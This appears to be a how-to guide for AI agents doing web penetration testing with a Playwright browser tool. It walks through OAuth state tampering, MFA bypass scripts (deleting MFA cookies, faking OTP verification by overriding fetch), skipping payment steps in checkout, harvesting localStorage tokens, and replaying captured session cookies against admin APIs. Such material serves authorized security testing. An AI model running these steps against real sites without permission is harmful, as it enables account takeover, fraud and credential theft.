# Playwright Browser Automation Guide

Playwright MCP gives executor agents a real browser for testing scenarios that
`curl` cannot reach: authenticated multi-step workflows, OAuth redirects, MFA
flows, JavaScript-rendered content, and visual evidence capture.

## Install (one-time)

```bash
sudo apt-get install -y python3-playwright
python3 -m playwright install chromium
```

## When to Use Playwright vs curl

| Use Playwright | Use curl |
|---|---|
| Login flow → session capture | Single-request API calls |
| OAuth / OIDC (multi-redirect) | JWT manipulation |
| MFA enrollment / bypass | Header injection |
| Multi-step checkout / wizard | Brute force / fuzzing |
| JavaScript-rendered pages | REST API parameter testing |
| Visual evidence (screenshots) | Rate limiting checks |
| Session cookie extraction | Blind SSRF probes |
| CSP bypass via DOM | XXE / SQLi |

## Available MCP Tools (playwright server)

| Tool | Purpose |
|---|---|
| `browser_launch` | Start browser (call first or to reset session) |
| `browser_navigate` | Go to URL, follow redirects |
| `browser_click` | Click by visible text, role, or CSS selector |
| `browser_fill` | Fill input by label / placeholder / selector |
| `browser_type` | Type char-by-char (for autocomplete inputs) |
| `browser_screenshot` | Save PNG to OUTPUT_DIR/screenshots/ |
| `browser_get_text` | Extract visible page text |
| `browser_get_cookies` | Export session cookies as JSON + curl header |
| `browser_set_cookies` | Inject previously captured cookies |
| `browser_evaluate` | Run JavaScript, return result |
| `browser_export_session` | Export cookies + localStorage → browser-session.json |
| `browser_export_har` | Record full page load as HAR file |
| `browser_close` | Close browser, end session |

---

## Pattern 1 — Login and Session Capture

```
# 1. Launch browser
browser_launch()

# 2. Navigate to login page
browser_navigate(url="https://target.com/login")

# 3. Screenshot before login (evidence)
browser_screenshot(name="01-login-page", output_dir=OUTPUT_DIR)

# 4. Fill credentials
browser_fill(target="Email", value="test@example.com")
browser_fill(target="Password", value="TestPass123!")

# 5. Submit
browser_click(target="Sign in")

# 6. Screenshot after login (evidence of success/failure)
browser_screenshot(name="02-post-login", output_dir=OUTPUT_DIR)

# 7. Export session for curl reuse
browser_export_session(output_dir=OUTPUT_DIR)
# → saves OUTPUT_DIR/artifacts/browser-session.json
# → returns curl_cookie_header for direct use

# 8. Use cookies in curl for remaining API tests
# curl -H 'Cookie: session=abc; csrf=xyz' https://target.com/api/admin
```

---

## Pattern 2 — OAuth / OIDC Flow Testing

```
# 1. Start from the application
browser_launch()
browser_navigate(url="https://target.com/login")
browser_screenshot(name="01-oauth-start", output_dir=OUTPUT_DIR)

# 2. Click "Login with Google/GitHub/Azure"
browser_click(target="Continue with Google")

# 3. Note the redirect URL (check for open redirect, state parameter fixation)
browser_evaluate(script="return window.location.href")

# 4. Fill IdP credentials
browser_fill(target="Email", value="test@attacker.com")
browser_click(target="Next")
browser_fill(target="Password", value="AttackerPass!")
browser_click(target="Sign in")

# 5. Check if state parameter is validated (CSRF check)
# Re-run flow but manually modify state in URL before authorization
browser_evaluate(script="""
  const url = new URL(window.location.href);
  url.searchParams.set('state', 'ATTACKER_CONTROLLED_STATE');
  window.location.href = url.toString();
""")

# 6. Check if code can be reused (replay attack)
browser_evaluate(script="return document.cookie")
browser_screenshot(name="02-oauth-complete", output_dir=OUTPUT_DIR)
browser_export_session(output_dir=OUTPUT_DIR)
```

OAuth findings to look for:
- Missing `state` parameter (CSRF on OAuth)
- `state` not validated server-side
- Authorization code reuse (replay)
- Open redirect in `redirect_uri`
- Token leakage in Referer header
- Insufficient `scope` validation

---

## Pattern 3 — MFA / 2FA Bypass Testing

```
# Phase A: Test response manipulation
browser_launch()
browser_navigate(url="https://target.com/login")
browser_fill(target="Email", value="victim@target.com")
browser_fill(target="Password", value="KnownPassword")
browser_click(target="Login")

# After password, app sends OTP and shows MFA page
browser_screenshot(name="03-mfa-prompt", output_dir=OUTPUT_DIR)

# Bypass attempt 1: Navigate directly past MFA page
browser_navigate(url="https://target.com/dashboard")
browser_get_text()  # if dashboard renders → MFA bypass (finding!)
browser_screenshot(name="04-mfa-bypass-attempt", output_dir=OUTPUT_DIR)

# Bypass attempt 2: Delete MFA step cookie/session flag
browser_evaluate(script="""
  document.cookie.split(';').forEach(c => {
    const key = c.split('=')[0].trim();
    if (key.toLowerCase().includes('mfa') || key.toLowerCase().includes('2fa')) {
      document.cookie = key + '=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/';
    }
  });
  return 'Cleared MFA cookies';
""")
browser_navigate(url="https://target.com/dashboard")
browser_screenshot(name="05-mfa-cookie-delete", output_dir=OUTPUT_DIR)

# Bypass attempt 3: Response code manipulation (requires Burp; Playwright shows the flow)
# Use browser_evaluate to intercept XHR and modify response status codes
browser_evaluate(script="""
  const origFetch = window.fetch;
  window.fetch = async (...args) => {
    const res = await origFetch(...args);
    if (res.url.includes('/api/verify-otp')) {
      // Clone response with 200 status
      return new Response(JSON.stringify({success: true}), {
        status: 200, headers: {'Content-Type': 'application/json'}
      });
    }
    return res;
  };
  return 'fetch intercepted';
""")
```

---

## Pattern 4 — Multi-Step Workflow Testing

```
# Test: can user skip payment step in checkout?
browser_launch()
browser_navigate(url="https://target.com")
browser_screenshot(name="10-home", output_dir=OUTPUT_DIR)

# Login first
browser_navigate(url="https://target.com/login")
browser_fill(target="Email", value="test@example.com")
browser_fill(target="Password", value="TestPass123!")
browser_click(target="Sign in")

# Add item to cart
browser_navigate(url="https://target.com/products/expensive-item")
browser_click(target="Add to Cart")
browser_screenshot(name="11-cart", output_dir=OUTPUT_DIR)

# Navigate to checkout step 1 normally
browser_navigate(url="https://target.com/checkout/address")
browser_screenshot(name="12-checkout-step1", output_dir=OUTPUT_DIR)

# BYPASS: skip to step 3 (confirm order) without paying
browser_navigate(url="https://target.com/checkout/confirm")
page_text = browser_get_text()
browser_screenshot(name="13-workflow-bypass-attempt", output_dir=OUTPUT_DIR)
# If confirm page renders → FINDING: workflow step bypass

# Export session for curl-based deeper API testing
browser_export_session(output_dir=OUTPUT_DIR)
```

---

## Pattern 5 — Session Cookie Security Analysis

```
browser_launch()
browser_navigate(url="https://target.com/login")
browser_fill(target="Email", value="test@example.com")
browser_fill(target="Password", value="TestPass!")
browser_click(target="Sign in")

# Extract and analyse cookies
cookies_json = browser_get_cookies()
# Parse JSON result — check each session cookie for:
#   secure: false     → Cookie sent over HTTP (finding if HTTPS site)
#   httpOnly: false   → Accessible to JS — XSS can steal it (finding)
#   sameSite: None    → No CSRF protection
#   domain: .target.com → Scoped correctly?

# Check localStorage for tokens (XSS would steal these)
browser_evaluate(script="""
  const items = {};
  for (let i = 0; i < localStorage.length; i++) {
    const k = localStorage.key(i);
    const v = localStorage.getItem(k);
    if (v && (v.length > 20 || k.toLowerCase().includes('token') || k.toLowerCase().includes('auth'))) {
      items[k] = v.substring(0, 100);
    }
  }
  return items;
""")
```

---

## Evidence Capture Standards

Every Playwright test sequence must capture:

1. **Before** — screenshot of initial state
2. **Action** — screenshot immediately after the critical action
3. **Result** — screenshot showing impact (dashboard loaded = bypass confirmed)
4. **Session export** — `browser_export_session()` for curl-based follow-up
5. **HAR** — `browser_export_har()` for complete request/response evidence

Save screenshots as: `NNN-descriptive-name.png` (numbered, chronological).
Save session to: `OUTPUT_DIR/artifacts/browser-session.json`.
Save HAR to: `OUTPUT_DIR/artifacts/capture.har`.

---

## Extracting curl Commands from Browser Session

After `browser_export_session()`:

```bash
# Load the saved session
SESSION=$(cat "$OUTPUT_DIR/artifacts/browser-session.json")
COOKIE_HDR=$(echo "$SESSION" | jq -r '"Cookie: " + ([.cookies[] | "\(.name)=\(.value)"] | join("; "))')

# Replay authenticated requests with curl
curl -s "https://target.com/api/admin/users" -H "$COOKIE_HDR" | jq .

# Extract specific token from localStorage
AUTH_TOKEN=$(echo "$SESSION" | jq -r '.local_storage.authToken // .local_storage.token // empty')
curl -s "https://target.com/api/admin" -H "Authorization: Bearer $AUTH_TOKEN" | jq .
```
